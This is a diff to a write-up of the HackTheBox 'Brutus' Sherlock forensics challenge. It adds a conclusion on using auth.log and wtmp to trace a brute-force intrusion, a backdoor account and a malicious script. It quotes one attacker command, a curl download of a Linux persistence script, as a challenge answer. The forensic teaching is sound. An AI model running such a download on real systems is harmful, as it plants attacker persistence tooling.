@@ -128,3 +128,11 @@ grep "cyberjunkie" auth.log | grep "sudo"
 ![attackercmd.png](/BrutusHTB/screenshots/attackercmd.png)
 
 Answer: ```/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh```
+
+# Conclusion
+
+In this Sherlock challenge, we used auth.log and wtmp to track the attacker’s activity on the server. By looking at failed logins, successful sessions, and timestamps in UTC, we were able to find the attacker’s IP, the compromised user account, and when they logged in. We also saw that the attacker created a backdoor account and ran a malicious script.
+
+This exercise shows how useful system logs are for understanding attacks and tracking what happened step by step. Simple tools like grep and parsers can give a clear picture of how an attacker moved through a system.
+
+![pwned.png](/BrutusHTB/screenshots/pwned.png)
